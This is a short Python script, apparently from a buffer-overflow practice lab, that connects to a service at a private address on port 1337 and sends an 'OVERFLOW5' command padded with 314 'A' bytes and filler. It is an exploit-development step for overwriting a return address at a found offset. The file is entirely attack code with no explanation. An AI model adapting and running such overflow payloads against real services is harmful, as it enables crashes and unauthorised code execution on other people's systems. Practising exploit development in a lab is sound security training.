import socket, struct

host, port = '10.10.60.7', 1337


command = b'OVERFLOW5 '
offset = 314
length = 1000
payload = b''.join([
command,
b'A'*offset,
b'C' * (length - offset)
])


with socket.socket() as s:
        s.connect((host,port))
        s.send(payload)
